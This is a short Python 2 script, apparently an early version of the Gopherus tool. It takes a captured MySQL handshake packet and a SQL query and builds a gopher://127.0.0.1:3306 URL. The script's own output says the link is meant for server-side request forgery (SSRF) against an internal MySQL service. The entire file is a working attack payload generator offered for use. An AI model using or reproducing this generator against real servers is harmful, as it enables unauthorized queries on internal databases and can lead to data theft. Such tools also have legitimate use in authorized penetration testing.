
# I have upgraded this tool, now it won't ask for MySQL packets, check here: https://github.com/tarunkant/Gopherus

dump = raw_input("Give connection packet of mysql: ")
query = raw_input("Give query to execute: ")

auth = dump.replace("\n","")

def encode(s):
    a = [s[i:i + 2] for i in range(0, len(s), 2)]
    return "gopher://127.0.0.1:3306/_%" + "%".join(a)


def get_payload(query):
    if(query.strip()!=''):
    	query = query.encode("hex")
    	query_length = '{:x}'.format((int((len(query) / 2) + 1)))
    	pay1 = query_length.rjust(2,'0') + "00000003" + query
    	final = encode(auth + pay1 + "0100000001")
    	return final
    else:
	return encode(auth)

print "\nYour gopher link is ready to do SSRF : \n"
print get_payload(query)
